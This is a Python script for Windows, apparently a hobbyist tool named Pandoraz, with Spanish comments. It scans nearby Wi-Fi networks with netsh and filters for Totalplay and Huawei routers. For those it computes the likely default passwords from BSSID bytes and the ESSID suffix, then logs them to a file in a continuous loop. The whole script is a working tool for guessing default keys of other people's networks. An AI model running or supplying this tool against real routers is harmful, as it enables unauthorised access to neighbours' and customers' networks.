# -*- Coding: UTF-8 -*-
# Python 3
# Windows
#
#   ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
#   ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
#   ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
#   ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
#   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
#                                                         By: LawlietJH
#                                                               v1.2.6

import datetime
import locale
import time
import os



Version = "v1.2.6"



# Banners: http://patorjk.com/software/taag/



Banner1 = """
      ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
      ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
      ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
      ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
      ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""
# Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz


Banner2 = """
                            ╔═╗┌─┐┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐
                            ╠═╝├─┤│││ │││ │├┬┘├─┤┌─┘
                            ╩  ┴ ┴┘└┘─┴┘└─┘┴└─┴ ┴└─┘
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=Pandoraz

Autor = """
                            ╦  ┌─┐┬ ┬┬  ┬┌─┐┌┬┐╦╦ ╦
                            ║  ├─┤││││  │├┤  │ ║╠═╣
                            ╩═╝┴ ┴└┴┘┴─┘┴└─┘ ┴╚╝╩ ╩
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=LawlietJH



#=======================================================================



def Dat():	# Función Que Permite Mostrar Los Datos Del Script.
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	print("\n\n", Banner1)
	print("\n\n", Autor)
	print("\n{:^80}".format(Version))
	
	os.system("TimeOut /NoBreak 1 > Nul")
	


def Salir(Num=0):	# Fucnión Que Permite Salir Del Script Sin Error Alguno.
	
	try:
		time.sleep(1.5)
		exit(Num)
	except KeyboardInterrupt:
		Salir(Num)



#~ Función Que Permite Esconder El Cursor de la Pantalla (La rayita que parpadea xD).
def HiddenCursor(imp="Hide"):
	
	#~ imp = imp.title()		#Devuelve la cadena solo con la primera letra de cada palabra en mayuscula
	imp = imp.capitalize()		#Devuelve la cadena solo con la primera letra de la primer palabra en mayuscula

	if os.name == 'nt':
		import msvcrt
		import ctypes

		class _CursorInfo(ctypes.Structure):
			_fields_ = [("size", ctypes.c_int),
						("visible", ctypes.c_byte)]
	
	def hide_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = False
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25l")
			sys.stdout.flush()

	def show_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = True
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25h")
			sys.stdout.flush()
			
	if imp == "Hide":
		hide_cursor()
	elif imp =="Show":
		show_cursor()
	else:
		pass



#=======================================================================



Red = False
Redes = []
Pwd = []
Tam = 0



#=======================================================================
			


def ObtenerRedes():
	
	global Tam
	Tam = 0
	xD = ""
	
	Cont = 0
	Cony = 0
	Conty = 0
	
	ESSID = []	# Nombre De La Red Wifi.
	BSSID = []	# Dirección MAC De La Red Wifi.
	Senial = []	# Porcentaje de Señal De La Red Wifi.
	Canal = []	# Canal De La Red Wifi.
	Datos = {}	# Diccionario Que Almacenará Las Listas.
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cadena = os.popen(Comando)
	Cadena = Cadena.read()
	Cadena = Cadena.split("\n")
	
	for X in Cadena:
		
		Conty += 1
		
		if Conty == 2:
			xD += "\n\n\t [+] " + X + "\n\n\t [*] "
		elif Conty == 3:
			if X.startswith("La"):
				xD += "La interfaz de la red de área local inalámbrica está\n\t"+\
					"     apagada y no es compatible con la operación solicitada."
			else: xD += X
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	
	print(xD)
	
	for x in Cadena:
		
		if "SSID" in x:
			
			Cont += 1
			x = x.split(" : ")[1]
			
			if Cont == 1:
				
				ESSID.append(x)
				Tam += 1 
				
			elif Cont == 2:
				
				x = x.upper()
				BSSID.append(x)
				Cont = 0
				
		elif "Se" in x:
			
			x = x.split(" : ")[1]
			Senial.append(x)
		
		elif "Canal" in x:
		
			x = x.split(" : ")[1]
			Canal.append(x)
	
	Datos["ESSID"] = ESSID
	Datos["BSSID"] = BSSID
	Datos["Senial"] = Senial
	Datos["Canal"] = Canal
	
	return Datos



def ImprimirListaWifi(Datos):
	
	global Redes, Red, Tam
	
	Red = False
	Redes = []
	Cont = 0
	
	print("\n\n\t      ESSID \t        Señal   Canal \t       BSSID",
	"\n\n ============================================================================\n")
	
	for x in range(Tam):
		
		if len(Datos["ESSID"][Cont]) > 18:
			print("    [*] {} - {}\n\t\t\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
		elif len(Datos["ESSID"][Cont]) > 11:
			print("    [*] {} - {}\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
		else:
			print("    [*] {} - {}\t\t {}\t  {}\t {}".format(x+1, Datos["ESSID"][Cont], Datos["Senial"][Cont], Datos["Canal"][Cont], Datos["BSSID"][Cont]))
			
		getNameRedes(Datos, Cont)
		
		Cont += 1
	
	print("\n ============================================================================")



def getNameRedes(Datos, Pos):
	
	global Red, Redes
	
	if "Totalplay" in Datos["ESSID"][Pos]:
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])
	
	elif "Huawei" in str(Datos["ESSID"][Pos]):
		
			Red = True
			Redes.append(Datos["ESSID"][Pos])
			Redes.append(Datos["Senial"][Pos])
			Redes.append(Datos["Canal"][Pos])
			Redes.append(Datos["BSSID"][Pos])



def getPassRedes():
	
	global Redes, Pwd
	
	Cont = 0
	Cony = 0
	Name = ""
	Pass = ""
	
	print("\n\n\n\n [+] Contraseñas Posibles De Redes Conseguidas:")
	
	if len(Redes) != 0:
		
		print("\n\n\t Red (ESSID) \t\tSeñal    Canal \t Contraseña")
		
		for X in Redes:
			
			Cont += 1
			
			if Cont == 1:
				
				Cony += 1
				Name = X
				print("\n [*] {} - {} ".format(Cony, X), end="\t")
			
			elif Cont == 2:
				print(" {}".format(X), end="    ")
			
			elif Cont == 3:
				print(" {}".format(X), end="\t")
			
			elif Cont == 4:
				
				Pass = getPass(Name, X)
				Pwd.append(Pass)
				
				print("  {}".format(Pass))
				
				Cont = 0
			
	else: print("\n\n\t [!] Sin Redes Disponibles... Por Ahora...")



def getPass(Nombre, MAC):
	
	if "Totalplay" in Nombre:
					
		Nombre = Nombre[-4:]
		MAC = MAC.split(":")
		Pass = MAC[3] + MAC[4] + Nombre
	
	elif "Huawei" in Nombre:
					
		Nombre = Nombre[-4:]
		MAC = MAC.split(":")
		Pass = MAC[3] + MAC[4] + Nombre
		
	return Pass



def SavePass():
	
	global Redes, Pwd
	
	Nombres = []
	
	open("Pass.zion","a")
	Eny = open("Pass.zion","r+")
	
	Lineas = Eny.readlines()
	
	for x in Lineas:
		
		x = x.split("\n")[0]
		
		if "ESSID: " in x:
			
			x = x.split(": ")[1]
			Nombres.append(x)
	
	Cont = 0
	Cony = 0
	Nomb = ""
	Cad1 = ""
	Cad2 = ""
	x = ""
	
	for xD in Redes:
		
		Cont += 1
		
		if Cont == 1:
			
			Nomb = xD
			
			Cad1 = "\n\t ====================================\n\t ESSID: " + Nomb +\
				   "\n\t * PWD: " + Pwd[Cony]
			
			Cony += 1
			
		elif Cont == 3:
			
			x = "\n\t Canal: " + xD
			
		elif Cont == 4:
			
			Cad2 = "\n\t BSSID: " + xD + x + "\n\t ===================================="
			Cont = 0
			
			if not Nomb in Nombres:
				
				dt = datetime.datetime.now()
				FH = dt.strftime("\n\n\t %A %d de %B del %Y - %H:%M").title()
				
				Eny.write(FH+Cad1+Cad2)



#=======================================================================



def Main():
	
	locale.setlocale(locale.LC_ALL, "es-MX")
	HiddenCursor()
	
	os.system("Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	
	print("\n\n\t\t [!] Escaneando La Red Wifi!")
	
	while True:
		
		Datos = ObtenerRedes()
		ImprimirListaWifi(Datos)
		getPassRedes()
		SavePass()
		
		try:
			os.system("TimeOut /NoBreak 1 > Nul")
		except KeyboardInterrupt:
			print("\n\n\t [!] Saliendo...")
			time.sleep(1.5)
			Dat()
			Salir(0)
			


Main()

